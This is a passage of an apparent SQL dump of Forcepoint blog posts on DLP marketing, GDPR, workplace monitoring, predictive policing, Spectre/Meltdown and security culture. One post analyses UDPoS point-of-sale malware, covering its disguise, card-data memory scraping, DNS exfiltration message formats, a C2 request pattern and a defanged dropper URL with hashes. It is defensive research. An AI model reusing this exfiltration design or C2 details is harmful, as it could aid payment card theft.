Adaptive Protection paradigm provides a security environment that protects users, data, networks and, ultimately, missions from unintentional or malicious compromise. It allows security professionals to cut through the noise to stop the bad and free the good.\n\n\n\n	Dynamic Data Protection - The Next Generation of DLP\n\n\n\n	Traditional data loss prevention (DLP) approaches can only stop a data exfiltration event—whether from a hostile account takeover or nefarious insider activity—by actively blocking all events that look like exfiltration, regardless of user intent. Striking the balance between the correct security policies and usability to accomplish the mission is a time consuming and manual process of system, rule and alert tuning. Forced to rely on static rules, typical DLP blocking is enforced with no understanding of the context surrounding the event. Therefore, even if the user is copying a file for appropriate agency use, they must obtain manual permissions to perform the action, slowing down operational efficiencies.\n\n\n\n	DLP is a powerful tool in the cybersecurity arsenal, but precision is key to balancing security with usability. This precision comes with the addition of user and entity behavioral analytics (UEBA) to develop context and inform user intent. By harnessing powerful analytics and insights, agencies develop the deep visibility of anomalous network, data and user behavior, and develop policies that adapt automatically to reduce alerts and increase data protections. Forcepoint is the first cyber security company to fully integrate UEBA with DLP offering a much more automated approach to protect sensitive information on agency networks. \n\n\n\n	How Forcepoint Dynamic Data Protection Works\n\n\n\n	Forcepoint Dynamic Data Protection empowers agencies to solve the fundamental challenges of historical DLP deployments to more effectively protect sensitive information, including Controlled Unclassified Information (CUI), on-premises or in the cloud. By delivering a dynamic cybersecurity approach with intelligent analytics, unified policy and orchestration, the integration of Forcepoint DLP and Forcepoint UEBA provides an end-to-end, human-centric architecture with built-in monitoring and enforcement controls. Forcepoint Dynamic Data Protection dynamically protects data based on the calculated behavioral risk level of users and the value of the data, dramatically reducing the quantity of alerts requiring investigation. This not only amplifies coverage, it provides the means to better understand risky behavior and automate policies.\n\n\n\n	For example, should an account associated with a low risk level suddenly begin performing abnormal actions (e.g., downloading large quantities of files in the middle of the night), the system will take all the context into account (e.g., badge entry logs do not show building entry, VPN access logs do not show a login event) to automatically change the account security profile. Integrating with additional external data sources, such as a SIEM, increase the robustness of risk adaptive protection contextual models.\n\n\n\n	Analytics models watch an account’s behavior over time to establish baselines. With baselines in place, the models use advanced techniques like machine learning to look for potential early indicators of compromise, attempts to escalate account privileges and unusual network activity. Analytics make it easy to detect when an account is collecting data from locations on the network or cloud infrastructure that have never been visited before (Figure 1).\n\n\n\n	\n\n\n	Figure 1: Risk Level Assignment\n\n\n\n	Detecting early indicators, particularly during off hours when there may not be staff available to monitor DLP alerts, is key to identifying high-risk activity scenarios to escalate risk levels and security policy enforcement mechanisms. When an account risk level rises, the associated security policies within DLP are also elevated to prevent the loss of sensitive data.\n\n\n\n	With easy to configure tools, administrators can define specific actions (e.g., allow upload to a cloud app, account lockdown, network location access prevention) associated with each risk level (Figure 2).\n\n\n\n	\n\n\n	Figure 2: System Action Assignment by Risk Level\n\n\n\n	 \n\n\n\n	Summary \n\n\n\n	Forcepoint Dynamic Data Protection presents a highly effective approach to managing and monitoring an agency’s current data loss prevention program. It represents the ideal starting point for agencies beginning a data loss prevention initiative.\n\n\n\n	Forcepoint\'s human-centric cybersecurity approach comes from decades of experience in military and high-assurance mission environments analyzing the behavioral rhythms of enterprise users on managed and unmanaged corporate networks. Forcepoint’s intelligent systems apply a range of security countermeasures to address risk. Leveraging this experience, Forcepoint delivers Risk-Adaptive Protection that is uniquely suited to protect government data, including Controlled Unclassified Information (CUI), wherever it resides, with solutions scaled to support your security program.', 'https://www.forcepoint.com/blog/insights/protecting-federal-agencies-most-sensitive-information-just-got-easier\n');

And as GDPR regulations take effect in the next 60 days, practices on handling personal data will be subjected to stricter legal requirements.\n\n\n\n	\n	GDPR requires any company processing, storing or utilizing data related to EU citizens to adhere to new laws, which could result in citations and fines if found non-compliant. Those fines could be up to 4% of your global revenue.  This requirement is for both public companies and private companies that handle any information for EU citizens.... not just companies located in Europe. Any breach of this data will require organizations to report within a 72-hour timestamp, which is a short runway for complete response, and to have a remediation plan.\n\n\n\n	As these regulations take effect, EU citizens and organized parties will cite these requirements and request to be removed from the inventory of data. Facebook has taken a good first step in preparing to allow users transparency, it will be interesting to see if similar organizations follow suit.

The resulting advice to business owners was that they must own their data and be responsible for protecting it.  The panel decided that, as threats change, we must be ready to adapt to the changing landscape and utilise the most appropriate solutions available to us. In addition, we must focus on the basics and get those right—user education, proactive malware detection, strong patching and a good backup procedure—nothing new there.  Would you agree that ransomware is the biggest threat to your organisation?\n\n\n\n	Another keynote I heard was from the ever energetic Mikko Hypponen, whose talk revolved around IOT. With processing power becoming cheaper and devices becoming smaller, he proposed that even future “dumb” devices will become connected with the goal of collecting data (data being the new oil).  It will become even more important to understand why our personal data is being collected, and how it is being used in ways far beyond advertising and social media. \n\n\n\n	Another topic during the talk was automation, widely considered at odds with what humans desire.

Not necessarily vendor consolidation, but functional consolidation.  \n	\n\n	Forcepoint’s Human Point System aims to tackle both of these issues. By focusing on the Human, we want to deliver individualized cybersecurity. With a better understanding of intent, we can provide the context available to make more informed decisions, greatly improving the efficacy of your protection. \n\n\n\n	One of the key tenets of the Human Point system is that while our products each have market leading capabilities that solve challenging customer problems, we believe that when our products work together, we can truly deliver capabilities far superior to what a point product can do alone.\n\n\n\n	For proof of this, look no further than McAfee’s (DLP) acquisition of Skyhigh Networks (CASB) or Splunk’s (SIEM) acquisition of Phantom (SOAR). Security vendors are acknowledging that the traditional silos of security are dissolving and that in order to deliver the value that customers demand, approaches like this are required. \n\n\n\n	Forcepoint remains ahead of this curve. We’re already integrating technologies into our portfolio to deliver the value that point products or loosely coupled products just can’t deliver.\n\n\n\n	We spent a fair amount of time with analyst firm IDC contributing to their DLP MarketScape Report, where we were recently named a Major Player. As part of this effort, we answered questions about our DLP product capabilities, restricted to the DLP silo. We know from speaking with our customers that they want more than traditional DLP – they (and we) see where analytics plus DLP can pay great dividends. With IDC, we shared the fact that we have upcoming integration with UEBA which would create a smarter, more effective and more accurate DLP, and that our customers are clamoring for it. We’re making the integrations where it makes sense and solves the most immediate customer concerns. While the vision of the Human Point System eventually incorporates all Forcepoint channels (NGFW among others), the 1.0 version of our solution focuses on integration with DLP.\n\n\n\n	Consider this: When the legacy firewall market transitioned to NGFW, the vendors leading the charge challenged convention and delivered all the legacy capability of firewalls, but with some additional features like application awareness. This was initially disruptive to the analyst community but over time has become accepted.  Forcepoint is choosing to lead the charge by combining analytics with DLP to produce a better result for our customers.\n\n\n\n	Come see for yourself. We’re a gold sponsor at RSA this April, and will be presenting in booth N3525 in Moscone North. Our primary message at the show is going to be about protecting the individual, and we believe we’ve got the right building blocks in the portfolio to deliver against that.

Furthermore, the topic is tantalizing, as it speaks to something that is happening today but we don’t think about: predictive policing.\n\n\n\n	For many readers, the idea of predicting crime might sound like science fiction – and indeed as the topic of Philip K. Dick’s “The Minority Report” it actually is. However, the use of Predictive Analytics (PA) to predict real-world crime is already being put to use on the streets of some US cities today. Our panel delved into some of the opportunities – and risks – of this kind of policing.\n\n\n\n	In case you’re wondering how I fit in to this topic, the subject isn’t as far removed from my day job as you might think. Forcepoint’s Human Point System is designed to provide early warning of employee misbehavior or impersonation – it’s essentially “pre-crime” detection, but on a more focused basis. Indeed, much of Forcepoint’s research is designed to discover ways that we can make a prediction about (for example) future data theft and provide protection for a company without penalizing the employee impacted by the prediction – who after all has not necessarily done anything wrong yet.\n\n\n\n	That’s the key with predictive analytics. It’s a two-step process: what is predicted, and what can be done about it. If the answer to the latter question is nothing, well, the prediction (even if accurate) is pretty much worthless. Fortunately, when it comes to data protection, there’s quite a lot we can do while still balancing the legitimate interests of both employee and employer. Done right (something we spend quite some time trying to do!), you really can have it both ways.\n\n\n\n	Unfortunately, when it comes to policing, things can be a bit more complicated. Let me explore that a bit.\n\n\n\n	First, as the panel explained, there are levels of prediction, ranging from predicting where crimes might occur to who is likely to commit a particular crime. As you can imagine, the impact of that latter prediction is a little bit more personal – imagine being suspected of a crime just because a computer said so… and that’s the heart of the issue. A prediction is just a probability; it does not actually tell the future.\n\n\n\n	Second, just like with cybersecurity, crime-based PA makes use of data from the past to predict the future. Thus, any algorithm is only as good as the data it is provided, and if that data is biased in terms of race or gender (or other attributes, for that matter) the predictions made will share that same bias. This is a well-known problem in PA – executives like Satya Nadella have said that one of the ten commandments of PA is “A.I. must guard against bias, ensuring proper, and representative research so that the wrong heuristics cannot be used to discriminate.” That’s a strong statement – and one that my fellow panelists and I would agree with, I think. Many would say that there is good evidence of bias in existing crime data – thus, any algorithm built on that data would itself be biased in the same way.\n\n\n\n	When it comes to crime, there’s been some pushback in the research community about these concerns. For example, ACLU and a group of 16 other organizations issued a statement expressing concern about the use of predictive policing, based on precisely these concerns about algorithmic bias. Furthermore, there is research that supports the argument that some predictive algorithms have, with no bad intention, created a system that impacts minorities more than others. Nobody wants that.\n\n\n\n	This all sounds very dark, but it doesn’t have to be. To quote Brandeis, “Sunlight is said to be the very best of disinfectants” – and our discussion aimed to shed light on what is a complex problem.\n\n\n\n	To progress, transparency is the key here: any system that attempts to predict crime should be subjected to rigorous third party scrutiny. Additionally, by thinking about the police role beyond strictly enforcement to include connection and engagement in the community, there is real opportunity. That’s the ray of hope that shone through: that we can work together across disciplines to help reduce crime, reduce discrimination, and reduce unreasonable surveillance through the application of science.\n\n\n\n	To do this, we must (MUST!) be willing to engage in a broad social dialogue about the type of society we want to live in, and the price we are willing to pay to reach that end state. To that end, groups like EFF play a critical role in helping force transparency when it is not readily given and provide a voice that speaks up clearly and articulately for those who might be losers in a predictive future. I applaud their efforts.\n\n\n\n	David Brin perhaps said it best during our time together. In essence, he argues that it is miraculous that we have come this far as a society, and we need to recognize the progress we have made – as well as the fact that we are as yet an imperfect union. By keeping both the vision and the problems front and center, we can work to fulfill the promise of PA done right.\n\n\n\n	I hope you take the time to look at some of the links I shared in this post, because PA is coming to a police department – or computer – near you soon. The technology will impact you in many ways, some subtle, some less so. We use it today in computer security, for example. To both designers, end users, and defenders, I say this: let’s keep the vision, but not be blind to the challenges that vision presents.', 'https://www.forcepoint.com/blog/insights/predictive-analytics-and-me-and-you\n');

And what are the implications for employees and employers as we navigate this new world? These were some of the questions that yesterday\'s panel, \"Breadcrumbs & Badges: Hacking Workplace Violence\" attempted to tackle.\n\n\n\n	Sharing the podium at Austin\'s SXSW conference were Forcepoint CEO Matt Moynahan, privacy and data security legal expert Elizabeth Rogers, and Pulitzer prize-winning journalist Byron Acohido, who moderated the conversation. \n\n\n\n	Here are a few highlights from the discussion:\n\n\n\n	Ms. Rogers brought her depth of understanding regarding privacy laws and regulations to the conversation, pointing out that new regulations such as GDPR will have implications for organizations well beyond the European Union. It\'s important that employers everywhere be prepared for a renewed focus on privacy and security in this increasingly interconnected age.\n\n\n\n	When asked about best practices, Matt Moynahan pointed out that privacy is practically a thing of the past. He emphasized that people routinely click on end user agreements and give information away on our own time. When it comes to monitoring, employers and organizations can be as transparent or opaque as they want to be -- at Forcepoint we advocate for transparency. He said that Forcepoint has tried to encourage customers to disclose what they\'re doing and why, and then focus on doing it correctly. It\'s important for obvious reasons to maintain morale within a workplace, as well as to be true to the culture of the company. If this is done right, and the security program is rolled out proactively, companies can often get culture points for it. More often than not people are willing to sacrifice for the greater good as long as they know they’re being respected and not abused. Respecting the identity of those you are monitoring is key. Good people will leave your company if trust is breached. Be clear about the program and set expectations from the beginning, and you can preserve your culture and your talent pool, rather than alienating your employees. \n\n\n\n	Following up on this, Ms. Rogers advised making cybersecurity at work a personal issue. Remind people that their own personal data is at risk, not just the IP of the company. And make information security and privacy awareness a core competency in your workplace, with associated goals as part of everyone\'s annual review.\n\n\n\n	Tomorrow afternoon, Richard Ford, chief scientist at Forcepoint, will continue our presence at SXSW by speaking on predictive analytics with another stunning lineup.

Today, Forcepoint announced fortifications to our Human Point System capabilities with deeper control and visibility into user identity, activity and intent across cloud deployments, cloud apps, remote locations and complex distributed networks. Visibility is especially important as more organizations rely more on cloud applications to power their productivity. It is estimated that the average enterprise today has over 1,000 SaaS applications.  Traditional security solutions do very little to provide the visibility and control necessary for these environments. Enter Cloud Access Security Brokers (CASB), delivering critical visibility and control to erase these security blind spots and implement a level of normalcy. Today we’re delivering CASB features that control sanctioned enterprise applications. We’re setting the pace for protecting users and data everywhere by making it easier to choose how to deploy robust web, email and data security to fit their fast-changing business or public sector environment. We’re also introducing the industry’s first single solution pricing for any deployment type – cloud, hybrid or on-premises. And as another option for on-premises web, email and data security we’re refreshing the Forcepoint V-series appliance.\n\n\n\n	More CASB functionality with Forcepoint Secure Web Gateway Solutions\n\n\n\n	Forcepoint offers an enterprise-class CASB solution with many industry-leading capabilities such as advanced cloud UEBA to help accurately detect anomalies and highly granular device control for managed and unmanaged (BYOD) devices. This is not the only way that Forcepoint is delivering CASB functionality to its customers. Since version 8.3 of our Web Security Gateway solution we have included critical CASB functionality - visibility and control for unsanctioned applications (Shadow IT), covering one of the most common CASB use case free of charge for our web security customers. With the 8.5 release, we are bringing secure web gateway and CASB even more closely together by including full CASB functionality through a Cloud Application Module, where web security customers can apply visibility and control of sanctioned enterprise cloud applications via inline (proxy) mode initially made available for customers using our on-premises (appliance) web security solution. Make no mistake, this utilizes the innovations of our Forcepoint CASB technology, but at a fraction of the price of a full CASB solution.\n\n\n\n	Industry-first single solution pricing and packaging\n\n\n\n	Our intent has been to bring Web and Email security solutions to customers no matter what their deployment preference might be – on-premises, SaaS, or hybrid (best of both worlds). We are now supporting these deployment choices with a single solution pricing / packaging model that allows customers to pay one price no matter the deployment architecture. Customers now know that when they buy our web and email security solutions, they will not have to pay again if they decide to change the deployment architecture, extending flexibility to the customer and reducing TCO over time.\n\n\n\n	Hardened appliance family offering up to 2x performance \n\n\n\n	As part of this launch, we are also providing some new appliance options. First, we are introducing a new V20000 option, which is our new high end 1U form factor appliance option that clocks in a performance that is over 2x the performance of our V10000. This new appliance option is simply a perfect fit for large organizations with greater than 8,000 users and data centers with pure optical cabling. Second, we announced the availability of the V10K G4R2 model which is a refresh of the V10K G4 model. This is a perfect solution for mid-sized enterprise customers that have 2,000 to 8,000 users. Third, we refreshed the X10G G2 blade, which is being replaced with the X10G G2R2 blade.

Are they protecting the data that you are asking them to process? How will they notify you if they suffer a breach? Consider that your data may be held within a cloud application – you will need to approach your cloud application providers too.\n	\n	\n		Consider whether you need to appoint a Data Protection Officer, or a DPO.

However, this appears to be a new family which we are currently calling \'UDPoS\' owing to its heavy use of UDP-based DNS traffic. At the time of writing, it\'s unclear whether the malware is currently being used in campaigns in the wild, although the coordinated use of LogMeIn-themed filenames and C2 URLs, coupled with evidence of an earlier Intel-themed variant, suggest that it may well be.\n\nNote: We have been in contact with LogMeIn throughout this investigation to help determine whether their services or products may have been abused as part of the malware deployment process. No evidence of this was found and it appears that the use of LogMeIn-themed filenames and C2 domain by the actors behind the malware is a simple ‘camouflage’ technique.\n\nUpdate: LogMeIn have published an advisory notice to their customers re-iterating the above. You can read their statement here.\n\nA set of two - service & monitor\n\nBehavioural analysis of the initial sample we discovered, a file named logmeinumon.exe, showed it contacting a similarly LogMeIn-themed C2 server hosted by a Swiss-based VPS provider (details below - note the use of an ‘L’ rather than an ‘I’ in the spelling of logmeln).\n\n\n\nInvestigation of the C2 revealed it also to be hosting the original dropper file, update.exe. This file is a 7-Zip self-extracting archive containing LogmeinServicePack_5.115.22.001.exe and logmeinumon.exe. Details of these files are in the table below. \n\n\n\nBoth of the LogMeIn-themed files have a compilation timestamp of 25 October 2017, suggesting that this is a relatively recent campaign.\n\nUpon executing update.exe, its content is extracted to the %TEMP% directory and LogmeinServicePack_5.115.22.001.exe automatically launched using 7-Zip\'s built in RunProgram feature.\n\nLogmeinServicePackLogmeinServicePack_5.115.22.001.exe – which we have called the service component – is responsible for setting up the malware by placing files into the System32\\LogMeInUpdService directory and creating a new system service for persistence. It does this via a batch file with a semi-random filename embedding standard Windows commands for file and service operations. Once finished it passes over execution to the monitoring component by launching logmeinumon.exe. \n\nThis monitoring component has an almost identical structure to the service component. It\'s compiled by the same Visual Studio build and uses the same string encoding technique: both executables contain only a few identifiable plain-text strings, and instead use a basic encryption and encoding method to hide strings such as the C2 server, filenames, and hard-coded process names.\n\nEvasive manoeuvres\n\nDespite maintaining a small footprint – only 88kb in size – the monitor component is a multi-threaded application which creates five different threads after its initialisation code is completed. This initialisation code is mainly responsible for decrypting and decoding the malware\'s internal strings, attempting to carry out an anti-AV/VM check, and either creating or loading an existing ‘Machine ID’ stored in a file called hdwid.dat in the same directory where the executables are deployed. This randomly generated identifier is used as {Machine ID} in all of the DNS queries detailed within this blog.\n\nFor the anti-AV and anti-VM solution, there are four DLL and three Named Pipe identifiers stored in both service and monitor components:\n\n\n\n\n\nHowever, only the monitor component makes use of these and, moreover, the code responsible for opening module handles is flawed: it will only try to open cmdvrt32.dll – a library related to Comodo security products – and nothing else.\n\nIt is unclear at present whether this is a reflection of the malware still being in a relatively early stage of development/testing or a straightforward error on the part of the developers.\n\nInitialisation & evasion\n\nAfter initialisation, including after reboots, the monitor component performs a DNS query on the embedded C2 address and retrieves the external IP address of the infected machine via an HTTP GET request:\n\n\n{C2URL}/index.php/?udpool={Machine ID}\n\n\n\nThe first time the malware is run, it also generates a batch file called infobat.bat which is similar in structure to the one examined for the service component. Again, this file uses a number of standard Windows commands to create a comprehensive fingerprint of the infected machine containing network, system, route, and process related information. This data is written to a local file called PCi.jpg and sent to the C2 server via DNS. Once complete, a flag is set in hdwid.dat.\n\n\n\nWhether this is intended for use later for lateral movement is unclear, but this information alone would be sufficient to treat this executable as malicious: the network map, list of running processes and list of installed security updates is highly valuable information.\n\nDNS comms & post setup functionality\n\nAfter the initial HTTP request to determine its external IP address, the monitor component appears to communicate exclusively via fake DNS requests, all of which follow the format\n\n\n{Machine ID}.{Message Type}.xxxx.xxxx.xxxx.xxxx\n\nwhere {Machine ID} is always 15 characters long, {Message Type} is taken from a set of pre-defined strings, and the actual message components \'xxxx\' can vary in length, but never exceed 31 characters.\n\nOur analysis identified five possible values for the {Message Type} field: bin, info, ping, trp, and note.\n\nThe bin messages are used to transmit the initial burst of data gathered into PCi.jpg by the infobat.bat process, while ping is a heartbeat message sent to the C2 every 60 minutes. \n\nInfo messages - as the name suggests - are purely informational and are despatched alongside ping messages:\n\n\n{PCNAME}; {USERNAME}; [NS:IP {C2URL}:{C2IP}]\n\nThe note and trp message types required further analysis and relate to the core functionality of the malware. Investigating the functionality spread across the additional threads revealed a process designed to collect Track 1 and Track 2 payment card data by scraping the memory of running processes. These processes are checked against an embedded and pre-defined blacklist of common system process and browser names with only ones not present on the list being scanned.\n\n\n\nIf Track 1/2 data is found in memory it will be extracted as is, converted to and sent as a trp message. A note message will be also generated and transmitted with the following content:\n\n\n[IP : {ipaddr} ] - String found in: {processname} -\n\nThe malware further logs this process name to a file called sinf.dat, the number of total processes with successful extraction to hdwid.dat and saves a hash of the trp message to udwupd.kdl, presumably for the purpose of keeping track of what has already been submitted to the C2 server.\n\nAll five message types are logged to the {Machine ID}.dat file prior to transmission.\n\n\n\nTimelines\n\nAs the underlying intent of the malware became clear to us, we attempted to identify further samples from the same family to determine whether this was something new (and possibly still being tested before deployment) or part of an ongoing campaign. \n\nThese efforts revealed another service component, but unfortunately not the corresponding monitor nor the parent 7-Zip SFX archive. Interestingly, this second service component was named ‘Intel Upgrade Services’ and apparently intended to masquerade as an Intel update as opposed to a LogMeIn update.\n\n\n\nBased on the compilation dates of the executables, the Intel-themed sample was created two weeks prior to the LogMeIn-themed one on 11 October 2017. Whether this is a sign that authors of the malware were not successful in deploying it at first or whether these are two different campaigns cannot be fully determined at this time due to the lack of additional executables.\n\nDesign decisions and detection rate\n\nThe coding style and techniques seen within the malware can hardly be described as outstanding. Beyond the faulty evasion code noted above, using data files written to disk instead of working predominantly in memory – besides leaving unnecessary trails – is rarely the trademark of bleeding edge malware and, equally, there are more advanced ways of fingerprinting a PC and generating a report. That said, the method used in this sample does appear to get the job done.\n\nOn the other hand, DNS-based communication and data exfiltration is genuinely unusual – although not unique – and can be quite effective. Nearly all companies have firewalls and other protections in place to monitor and filter TCP- and UDP-based communications, however DNS is still often treated differently providing a golden opportunity to leak data. \n\nThe overall impression is of a piece of malware inspired by the success of (and some of the better ideas and techniques employed by) its predecessors.\n\nDetection rates for the malware are still very low for the monitor component at the time of writing. Visibility is always an issue when it comes to non-traditional malware: samples which do not target standard endpoints or servers can quite easily be missed because of the lack of focus on protecting these sorts of systems.\n\nConclusion\n\nDiscovering a unique piece of malware is a rare event these days and UDPoS, while unusual, is not a new concept. There have been several Point of Sale malware families identified over the past few years, all with the same goal: harvesting credit card data on a large scale – consider how many different cards may be used in stores, bars, or restaurants across the course of a day, let alone weeks or months.\n\nFrom a consumer standpoint, protecting oneself against this sort of threat can be a tricky proposition for individuals: a PoS terminal could conceivably remain infected for significant lengths of time. However, enabling reporting on your credit card activity (many banks offer SMS, Push, and email alerts) can greatly reduce the time of discovery – and therefore recovery – if abuse does occur.\n\nFor many businesses, the situation may not be much better: legacy PoS systems are often based on variations of the Windows XP kernel and, in large retailers, may be present on hundreds or even thousands of devices. While Windows POSReady is in extended support until January 2019, it is still fundamentally an operating system which is seventeen years old this year.\n\nAs UDPoS highlights, exfiltrating stolen credit card data can and will result in unusual patterns of activity on the machines (DNS traffic in this case). By identifying and reacting to these patterns, businesses – both PoS terminal owners and suppliers - can close down this sort of attack sooner.\n\nProtection statement\n\nForcepoint customers are protected against this threat at the following stages of attack:\n\nStage 5 (Dropper File) - Malicious files are prevented from being downloaded.Stage 6 (Call Home) - Attempts to contact the C2 server are blocked.\n\nIndicators of Compromise\n\nC2 Server\n\n\nhxxp://service-logmeln[.]network/10/update.exe\nservice-logmeln.network\n\nSHA1 File Hashes\n\n\n195453b2dc788d393670db611116dcbc3994a1b4\nba3dc114f848a60f7af83533580b08c682d6f280\nd9f58b3c17a2a7b689bb3ed42bce6a5eb7855569\naab16598debb234a9a3732e45d1d1ef369da27d1', 'https://www.forcepoint.com/blog/security-labs/udpos-exfiltrating-credit-card-data-dns\n');

This is not a trivial point as the attack path is more complex than a simple phishing attack, for example.\n\n \n\nOriginal blog post\n\n\n\nAfter a flurry of rumors and speculation over the Christmas and New Year period, we’ve finally been given sight of two new whitepapers describing the attacks and a blog post from Google Project Zero describing a range of side-channel attacks against recent CPUs.\n\nThe attacks (in brief)\n\nModern CPUs are, unsurprisingly, rather complicated devices: they have the ability to run multiple commands simultaneously and to capitalize on this they can execute some commands out-of-order.\n\nIn effect, this means that they can a) choose to execute commands further ahead in a program if something else (e.g. reading data from memory) is delaying the current one; and b) speculate on which branch of a program to follow after a decision point in execution.\n\nMeltdown relies on the first type of out-of-order execution to read important OS memory and Spectre uses the latter ‘speculative execution’ approach.\n\nGoogle’s research demonstrates attacks using these techniques, one of which successfully leaks host system data to a virtual machine being run within KVM on Linux. The use of Spectre to violate browser sandboxing using JavaScript is also described within the original whitepaper.\n\nWho is affected?\n\nUnfortunately, more or less everyone, albeit to differing extents. Processors from Intel, AMD, and Arm are all potentially vulnerable to at least one variant of the Spectre/Meltdown attack, and the attacks can be implemented within both Linux and Windows environments.\n\nAnalysis\n\nStepping into the realms of speculation (no pun intended) so soon after the publication of a major vulnerability is, as always, fraught with caveats.\n\nOn unpatched systems both Spectre and Meltdown attacks can aid code execution attacks by defeating ASLR and leaking important information about memory layout. With Spectre’s applicability to web browser sandboxing, it seems plausible that we will come to see attacks which attempt to use a similar technique to leak browsers’ memory layouts in preparation for the deployment of an arbitrary code execution exploit.\n\nThat said, while these vulnerabilities are very severe and widespread to an extent which certainly hasn’t been seen in recent times, the bases on which they were developed aren’t overly new: side-channel attacks pre-date the modern computer and ring0 escalations have been seen before.\n\nProbably the most alarming of the proofs-of-concept released is the use of branch target injection (i.e. Spectre) to read host memory from inside a virtual machine. Again, this isn’t an entirely new concept: VM breakout bugs have naturally been of interest to researchers for quite some time, typically using virtual device drivers to attempt to run code on the host machine (e.g. Venom).\n\nAt the time of writing, it remains unclear as to whether or not some variant of Spectre could be used to inject code into the host machine as opposed to reading the contents of its memory – Intel believe this not to be viable – but, regardless, the ability to read host memory is a major security risk on its own and its ubiquity courtesy of being the result of a hardware flaw a major concern. It seems likely that mitigations against this in particular are likely to have a measurable performance impact until non-vulnerable hardware is developed, released, and deployed.\n\nIf there’s a silver lining to this (for some, at least) it’s that it appears that access to vulnerable systems or VMs – be that local or remotely via another exploit – is required to implement these attacks against the kernel. While this is scant consolation for suppliers of virtualised infrastructure who may be exposed to malicious actors purchasing cloud-hosted VMs, it does push the actual exploitation of these vulnerabilities into the somewhat more rarefied territory of advanced, persistent threat actors.\n\nMitigation & recommendations\n\nPatches are being released for major operating systems at the time of writing and, as always, Forcepoint Security Labs strongly recommend adherence to a robust patching policy.\n\nThere are, however, some caveats:\n\nMicrosoft have identified that certain antivirus packages make unsupported calls to kernel memory which, after application of the new patch, can cause ‘blue screen’ errors  on both client and server devices;\n	Microsoft also warn of potential performance impacts after applying the patch, the extent of which is unclear at present. While it seems likely that CPU vendors will already be working hard to mitigate these issues in their next-generation hardware, this will have an ongoing impact until all of the affected hardware is retired – possibly in half a decade or more.\nWe will provide updates via this blog and appropriate customer communication channels as more information becomes available.\n\nReferences\n\nhttps://meltdownattack.com/\n	https://spectreattack.com/spectre.pdf\n	https://meltdownattack.com/meltdown.pdf\n	https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html\n	https://en.wikipedia.org/wiki/Side-channel_attack\n	https://labs.bitdefender.com/wp-content/uploads/downloads/2014/10/Gaining-kernel-privileges-using-the-Xen-emulator.pdf\n	http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3456\n	https://newsroom.intel.com/news/intel-responds-to-security-research-findings/\n	https://support.microsoft.com/en-us/help/4072699/important-information-regarding-the-windows-security-updates-released \n	https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002', 'https://www.forcepoint.com/blog/security-labs/looming-spectre-meltdown\n');

It’s always interesting visiting another country, and so it was with some excitement that I traded the wonderful weirdness of Austin for the formality and deep history of London.\n\n\n\n	The purpose of my trip to the UK was to meet with customers, catch up with Forcepoint researchers, and to take part in an event we were hosting – a round table dinner about the intersection of HR, Legal, and Security, especially as it relates to employee monitoring. That dinner was fascinating, but I’ll save a discussion of that event for another time. Instead, I want to talk about something a little bit more personal, but directly related to those topics: culture.\n\n\n\n	Every time I fly to the UK, I try and get to my home town for a night to visit with family – I was born in England, and moved to the US in my late 20’s. When I’m in meetings in the UK, it’s all business so it feels very much like being in the USA. However, when I’m at home, in a much less formal setting, I am able to experience the subtle differences in culture. Those cultural differences are things I miss – it’s not a matter of better or worse, but there’s something wonderfully familiar to me about my English roots.\n\n\n\n	These differences are also something to celebrate, but they’re at the heart of some of the toughest challenges we face when trying to design security solutions that look at content. As anyone who has done business worldwide will attest, creating a single unified company policy without treading on the cultural sensibilities of local offices is a difficult task. In my specific world, doing that with respect to security is doubly difficult.\n\n\n\n	Let’s take a specific example: the level of monitoring that is acceptable in different environments and different locales. Here, the differences are broad: for some organizations, such monitoring is omnipresent, whereas in others it’s viewed as “impossible,” either for legal reasons or for cultural. Knowing where you stand legally is a little more black and white (as an aside, Forcepoint sponsored an outstanding whitepaper by Hogan Lovells on what is and is not legal in various jurisdictions…it’s well worth a read), so armed with the legal knowledge of what’s possible, the next step is much harder: what is culturally acceptable.\n\n\n\n	The challenge remains: how do you build a single security culture while preserving the wonderful differences we have worldwide? I would suggest that there are three key steps to take.\n\n\n\n	First, be open about the company’s real goals. No commercial company that I know of is interested in the minutiae of an employee’s personal life…the ONLY goal of monitoring is to provide protection for the company’s data and for other employees. Being clear about the objectives opens the door to a real conversation. Be honest, too, about your motives: if you are using data for something other than security, you should be clear about that.\n\n\n\n	Second, in the context of the conversation, start with what’s right, not with what can you do. Let me explain that a bit, as it’s not obvious. If we start with the law, we end with a list of things we can do (for example, you can collect browsing history but not keystrokes), and then we do those things. That’s one way to approach the problem, but it can sometimes result in over-collection for the task at hand. I prefer the human-first approach, where we look at the people, and decide what’s the best overall good for both the person and for security. Now, armed with this list, we ensure that it’s in compliance with local laws, and adjust when it’s not. The former approach leads with thinking about what you need; the latter leads with what you can get.\n\n\n\n	Finally, engage fully in each locale, involving both local HR representatives and workers councils, as well as regular members of the community. Talk about what’s being done elsewhere and why – focus on blending the global stance of the company while considering local needs and norms. Again, I can’t stress the word “conversation” strongly enough: this has to be a real dialog.\n\n\n\n	Becoming “one global company” is something that Forcepoint has spent considerable energy on over the last couple of years. After all, we have offices all over the world, from Australia to Virginia (I was hoping for a ‘Z’ there, but it was not to be…yet…I’m sure we’re working on it!), but we’re one company with one set of needs with respect to security. It’s been a rewarding ride and we’re not done yet, but I think we’ve kept what’s special about each location yet are becoming unified on the operational processes that matter. One company, one set of needs, but many different people. Culture matters.', 'https://www.forcepoint.com/blog/insights/culture-matters-security-best-practices-global-era\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (29, 'Vesting browsers with our trust', 'Robert NeumannJohn BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'We recently wrote about the Quant malware coming with pre-packaged password stealing capabilities. We all understand that physical security is important, choose our locks carefully and consciously keep our keys where we believe they will be safe from being stolen, but do we adhere to the same standards for our passwords? \n\nProbably not… \n\nExamples of stolen credentials \n\nWhen working with data we gathered from various Quant Loader C2 servers we also validated some of our assumptions regarding average password strength. As expected the majority were not on the strong side and there were some real eye openers.\n\n\n\nA Digital Key-Hook \n\nUnfortunately, as can be seen from the examples above, the intangibility of passwords often results in people being significantly less worried about them than something physical – we need look no further than the recent controversy over British politicians sharing passwords for a real-world example of this.\n\nVoluntary password sharing aside, people are generally unwilling to remember a couple of dozen different passwords and PIN codes and tend to trust in software to remember things for them.\n\nThere exist a number of applications which act as \'virtual safes\' to hold our passwords and keep them away 